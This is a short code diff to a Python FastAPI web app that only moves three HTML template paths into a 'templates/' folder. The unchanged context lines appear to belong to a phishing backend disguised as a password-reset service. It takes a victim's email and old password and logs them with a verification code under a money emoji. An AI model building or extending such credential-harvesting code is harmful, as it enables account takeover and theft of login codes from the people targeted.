@@ -21,7 +21,7 @@ async def reset_password():
 
 @app.get("/reset-failed", response_class=HTMLResponse)
 async def reset_failed():
-    with open("reset-failed.html", "r") as f:
+    with open("templates/reset-failed.html", "r") as f:
         return f.read()
 
 
@@ -39,7 +39,7 @@ async def submit_form(email: str = Form(...), old_password: str = Form(...)):
 async def login_code(request: Request):
     email = request.query_params.get("email", "")
     old_password = request.query_params.get("old-password", "")
-    with open("login-code.html", "r") as f:
+    with open("templates/login-code.html", "r") as f:
         page = f.read()
 
     page = page.replace("{user-email}", email)
@@ -64,7 +64,7 @@ async def login(
         f"\n{__now} >>> 💰 Verification code for {email}: {code} (password: {old_password})\n"
     )
 
-    with open("change-password.html", "r") as f:
+    with open("templates/change-password.html", "r") as f:
         return f.read()
 
 
